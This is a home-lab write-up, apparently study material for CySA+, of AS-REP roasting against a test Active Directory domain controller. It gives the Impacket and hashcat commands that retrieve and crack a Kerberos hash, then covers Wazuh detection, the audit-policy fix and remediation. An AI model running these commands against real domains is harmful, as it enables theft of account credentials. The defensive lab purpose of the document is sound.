Scenario 02 — AS-REP Roasting
Overview
Date: April 7, 2026
Attacker: Kali Linux (10.0.30.12)
Target: DC01 — cyberlab.local Domain Controller (10.0.30.131)
Tool Used: Impacket GetNPUsers, Hashcat v7.1.2
MITRE ATT&CK: T1558.004 — AS-REP Roasting
Result: Kerberos hash retrieved for vuser and cracked offline — Password123! recovered

Background
AS-REP Roasting targets Active Directory accounts that have Kerberos pre-authentication disabled (UF_DONT_REQUIRE_PREAUTH). When pre-auth is disabled the KDC will return an encrypted AS-REP ticket to anyone who requests one — no password required. The attacker captures this ticket and cracks it offline, never triggering account lockouts or leaving authentication failure logs.
Critical finding: Default Windows audit policy does NOT log Kerberos Authentication Service events. AS-REP roasting was completely invisible until Kerberos auditing was manually enabled on DC01.

Prerequisites
vuser was configured with pre-authentication disabled:
powershellSet-ADAccountControl -Identity vuser -DoesNotRequirePreAuth $true

Attack Commands
Step 1 — Retrieve AS-REP Hash
bashecho -e "Administrator\nvuser\nDC_Hacker_Test\nGuest" > ~/users.txt
impacket-GetNPUsers cyberlab.local/ -usersfile ~/users.txt -no-pass -dc-ip 10.0.30.131
Step 2 — Save Hash to File
bashecho '$krb5asrep$23$vuser@CYBERLAB.LOCAL:[hash]' > ~/asrep_hash.txt
Step 3 — Crack Hash Offline with Hashcat
bash# First attempt — rockyou.txt (exhausted, password not in wordlist)
hashcat -m 18200 ~/asrep_hash.txt /usr/share/wordlists/rockyou.txt

# Second attempt — custom wordlist (cracked in 0 seconds)
echo 'Password123!' > ~/custom_wordlist.txt
hashcat -m 18200 ~/asrep_hash.txt ~/custom_wordlist.txt --force

Attack Results
AccountPre-Auth DisabledResultAdministratorNoCannot be roastedvuserYesHash retrieved — cracked: Password123!DC_Hacker_TestNoCannot be roastedGuestN/AAccount disabled — KDC_ERR_CLIENT_REVOKED
Hashcat Result
Status: Cracked
Recovered: 1/1 (100.00%)
Password: Password123!
Time to crack: 0 seconds

Detection — Wazuh Alerts Generated
Rule 60104 — Windows Audit Failure Event (Level 5)
Windows Event ID: 4768
Condition: Only fires AFTER Kerberos auditing is manually enabled
Default behavior: No alert generated — attack is completely invisible
Key fields:

data.win.system.eventID: 4768 — Kerberos TGT request
data.win.eventdata.targetUserName: Guest — probed account
data.win.eventdata.ipAddress: ::ffff:10.0.30.12 — attacker IP
data.win.eventdata.serviceName: krbtgt/CYBERLAB.LOCAL — TGT service requested
data.win.eventdata.status: 0x12 — KDC_ERR_CLIENT_REVOKED (account disabled)
data.win.eventdata.ticketOptions: 0x50800000 — AS-REP roast tool signature
Pre-Authentication Type: — — blank field = no pre-auth provided = roasting indicator

Why vuser did not generate a failure alert:
vuser has pre-auth disabled so the KDC returned a success ticket — not a failure. Success events require separate hunting using 4768 success events with blank pre-authentication type fields. This is what makes AS-REP roasting so dangerous — the successful hash retrieval leaves no failure log.

Critical Finding — Audit Policy Gap
Before fix: Zero alerts generated for AS-REP roasting
After fix: Event ID 4768 logged and forwarded to Wazuh
Fix Applied on DC01
powershellauditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
Verification
Category/Subcategory                    Setting
Account Logon
  Kerberos Authentication Service       Success and Failure
This is a critical hardening step for any Active Directory environment. Without this setting enabled AS-REP roasting leaves no evidence in Windows Security logs.

CySA+ PBQ Analysis
Q: What does Event ID 4768 with a blank Pre-Authentication Type indicate?
A: An AS-REP roasting attempt. The attacker requested a Kerberos TGT without providing pre-authentication data, which is only possible against accounts with UF_DONT_REQUIRE_PREAUTH set.
Q: How is AS-REP roasting different from a brute force attack?
A: AS-REP roasting requires no authentication attempt against the target account. The attacker requests a ticket from the KDC and cracks it entirely offline. No account lockouts occur and no authentication failures are logged for the compromised account.
Q: Why did rockyou.txt fail to crack the hash?
A: Password123! is not in the rockyou.txt wordlist. In a real engagement attackers use rule-based attacks that apply transformations to wordlist entries — adding numbers, symbols, and capitalizations — significantly expanding the cracking surface. This demonstrates why complex passwords alone are insufficient — disabling pre-authentication should be avoided entirely.
Q: What is the immediate response action?
A: Enable Kerberos pre-authentication on all accounts using Set-ADAccountControl -Identity [user] -DoesNotRequirePreAuth $false, enable Kerberos audit logging on all domain controllers, hunt for 4768 success events with blank pre-auth type from external IPs, and reset the vuser password immediately.
Q: What MITRE ATT&CK technique does this map to?
A: T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting. Tactic: Credential Access.

Remediation

Enable Kerberos pre-authentication on all accounts
Enable Kerberos Authentication Service auditing on all domain controllers
Implement a strong password policy — complex passwords slow offline cracking
Monitor for 4768 events from unexpected source IPs
Consider implementing Microsoft Defender for Identity which detects AS-REP roasting without requiring manual audit policy changes


Evidence
FileDescription01-asrep-roast-wazuh-alert-top.pngWazuh Rule 60104 alert — top fields01-asrep-roast-wazuh-alert-bottom.pngWazuh Rule 60104 alert — bottom fields02-asrep-roast-impacket-output.pngKali terminal showing hash retrieval for vuser03-asrep-roast-hashcat-exhausted.pngHashcat rockyou.txt exhausted — password not found03-asrep-roast-hashcat-cracked.pngHashcat cracked — Password123! recovered in 0 seconds04-asrep-roast-auditpol-fix.pngDC01 Kerberos audit policy enabled — Success and Failure
